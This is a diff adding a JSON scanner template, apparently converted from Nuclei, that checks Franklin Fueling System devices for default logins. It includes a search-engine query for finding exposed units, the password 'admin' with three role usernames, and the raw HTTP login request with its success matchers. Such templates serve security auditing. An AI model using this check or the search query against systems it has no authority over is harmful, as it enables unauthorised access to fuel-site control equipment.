@@ -1,0 +1,142 @@
+{
+  "id": "franklin-fueling-default-login",
+  "name": "Franklin Fueling System - Default Login",
+  "author": "r3Y3r53",
+  "severity": "HIGH",
+  "description": "A default password vulnerability refers to a security flaw that arises when a system or device is shipped or set up with a pre-configured, default password that is commonly known or easily guessable.\n",
+  "references": [
+    "https://www.exploitalert.com/view-details.html?id\u003d39466"
+  ],
+  "tags": [
+    "default-login",
+    "franklin"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "google": "inurl:\"relay_status.html\""
+  },
+  "variables": {
+    "password": [
+      "admin"
+    ],
+    "username": [
+      "roleAdmin",
+      "roleUser",
+      "roleGuest"
+    ]
+  },
+  "variablesType": "pitchfork",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /21408623/cgi-bin/tsaws.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n\u003cTSA_REQUEST_LIST PASSWORD\u003d\"{{password}}\"\u003e\u003cTSA_REQUEST COMMAND\u003d\"cmdWebCheckRole\" ROLE\u003d\"{{username}}\"/\u003e\u003c/TSA_REQUEST_LIST\u003e\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(content_type, \"text/xml\")",
+            "contains(body, \"\u003c/TSA_RESPONSE_LIST\u003e\")",
+            "contains(body, \"roleAdmin\") || contains(body, \"roleUser\") || contains(body, \"roleGuest\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "franklin-fueling-default-login",
+    "info": {
+      "name": "Franklin Fueling System - Default Login",
+      "author": "r3Y3r53",
+      "severity": "high",
+      "description": "A default password vulnerability refers to a security flaw that arises when a system or device is shipped or set up with a pre-configured, default password that is commonly known or easily guessable.\n",
+      "reference": [
+        "https://www.exploitalert.com/view-details.html?id\u003d39466"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 1,
+        "google_query": "inurl:\"relay_status.html\""
+      },
+      "tags": "default-login,franklin"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "username": [
+            "roleAdmin",
+            "roleUser",
+            "roleGuest"
+          ],
+          "password": [
+            "admin"
+          ]
+        },
+        "attack": "pitchfork",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /21408623/cgi-bin/tsaws.cgi HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml\n\n\u003cTSA_REQUEST_LIST PASSWORD\u003d\"{{password}}\"\u003e\u003cTSA_REQUEST COMMAND\u003d\"cmdWebCheckRole\" ROLE\u003d\"{{username}}\"/\u003e\u003c/TSA_REQUEST_LIST\u003e\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(content_type, \"text/xml\")",
+              "contains(body, \"\u003c/TSA_RESPONSE_LIST\u003e\")",
+              "contains(body, \"roleAdmin\") || contains(body, \"roleUser\") || contains(body, \"roleGuest\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
